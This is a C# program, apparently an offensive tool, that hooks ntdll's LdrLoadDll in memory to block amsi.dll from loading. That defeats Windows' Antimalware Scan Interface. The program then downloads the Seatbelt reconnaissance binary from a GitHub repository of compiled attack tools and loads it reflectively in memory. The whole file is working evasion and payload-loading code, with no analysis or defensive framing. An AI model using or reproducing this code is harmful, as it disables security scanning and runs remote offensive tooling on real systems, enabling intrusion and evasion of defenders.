
using System;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Net.Http;
namespace HookLdrLoadLib
{
    internal class Program
    {

        static byte[] jumpBytes = new byte[]
        {
           0x48 ,0xb8,                   //mov rax,0x000000
           0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00,0x00,
           0xFF, 0xE0,                    //jmp rax
           0xC3
        };

        static byte[] orginalBytes = new byte[jumpBytes.Length];

        static IntPtr hLdrLoadDll = IntPtr.Zero;
        static void Main(string[] args)
        {

            var hNtdll = Native.LoadLibrary("ntdll.dll");

            hLdrLoadDll = Native.GetProcAddress(hNtdll, "LdrLoadDll");
            
            Marshal.Copy(hLdrLoadDll, orginalBytes, 0, orginalBytes.Length);
            
            HookLdrLoadDll();

            var bytes = new HttpClient()
                .GetByteArrayAsync("https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe")
                .Result;
            var asm = Assembly.Load(bytes);
            Console.WriteLine("Loaded -> {0}", asm.FullName);

        }

        static void HookLdrLoadDll() 
        {
            //Get Method Info for LdrLoadDllHook
            var methodInfo = typeof(Program)
                .GetMethod(nameof(LdrLoadDllHook), BindingFlags.Static | BindingFlags.NonPublic);

            //Get Function pointer
            var functionPointner = methodInfo.MethodHandle
                .GetFunctionPointer();

            //Address to bytes
            var addressBytes = BitConverter
                .GetBytes(functionPointner.ToInt64());

            //Change jmp address
            addressBytes.CopyTo(jumpBytes, 2);

            //Change memory protection to be writable
            bool isChanged = Native
                .VirtualProtect(hLdrLoadDll, jumpBytes.Length
                , Native.ReadWrite, out uint oldProtect);

            if (!isChanged)
            {
                Console
                    .WriteLine("[-] Cannot change memory protection -> {0}", hLdrLoadDll);
                return;
            }

            //Write our jmp instructions
            Marshal.Copy(jumpBytes, 0, hLdrLoadDll, jumpBytes.Length);


            //Restore memory protection
            isChanged = Native
                .VirtualProtect(hLdrLoadDll, jumpBytes.Length
                , oldProtect, out oldProtect);

            if (!isChanged)
            {
                Console
                    .WriteLine("[-] Cannot Restore memory protection -> {0}", hLdrLoadDll);
                return;
            }
        }
        static void UnhookLdrLoadDll() 
        {
            //Change memory protection to be writable
            bool isChanged = Native
                .VirtualProtect(hLdrLoadDll, orginalBytes.Length
                , Native.ReadWrite, out uint oldProtect);

            if (!isChanged)
            {
                Console
                    .WriteLine("[-] Cannot change memory protection -> {0}", hLdrLoadDll);
                return;
            }

            //write origranl bytes
            Marshal.Copy(orginalBytes, 0, hLdrLoadDll, orginalBytes.Length);

            //Restore memory protection
            isChanged = Native
                .VirtualProtect(hLdrLoadDll, orginalBytes   .Length
                , oldProtect, out oldProtect);

            if (!isChanged)
            {
                Console
                    .WriteLine("[-] Cannot Restore memory protection -> {0}", hLdrLoadDll);
                return;
            }

        }
        static uint LdrLoadDllHook(IntPtr SearchPath,
            IntPtr DllCharacteristics,                
            ref Native.UnicodeString DllName,
            out IntPtr BaseAddress  
        )
        {
            //If dll is being loaded is Amsi.dll just return access denied 
            if (DllName.ToString()
                .IndexOf("amsi.dll", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                BaseAddress = IntPtr.Zero;
                return Native.NtStatusAccessDenied;
            }
            //we need to load other dlls So we don't break functionality

            //First We Restore LdrLoadDll 
            UnhookLdrLoadDll();

            //Call Orignal LdrLoadDll
            var status = Native
                .LdrLoadDll(SearchPath, DllCharacteristics, ref DllName, out BaseAddress);
            
            //Hook LdrLoadDll again
            HookLdrLoadDll();

            return status;
        }
    }
    internal class Native 
    {

            internal const uint ReadWrite = 0x04;

            public static uint NtStatusAccessDenied = 0xC0000022;

            [DllImport("kernel32.dll")]
           internal static extern bool VirtualProtect(IntPtr lpAddress,
       int dwSize, uint flNewProtect, out uint lpflOldProtect);

            [DllImport("kernel32")]
            internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            internal static extern IntPtr LoadLibrary(string lpFileName);
            [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
            public static extern uint LdrLoadDll(
                IntPtr SearchPath,IntPtr DllCharacteristics,
                ref UnicodeString DllName,
                out IntPtr BaseAddress);


            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            internal struct UnicodeString
            {
                public ushort Length;          
                public ushort MaximumLength;   
                public IntPtr Buffer;          
                public UnicodeString(string s)
                {
                    Length = (ushort)(s.Length * 2);
                    MaximumLength = (ushort)((s.Length + 1) * 2); // +1 for null terminator
                    Buffer = Marshal.StringToHGlobalUni(s);       
                }

                public override string ToString()
                {
                    return Marshal.PtrToStringUni(Buffer, Length / 2);            
            }
        }
    }
}
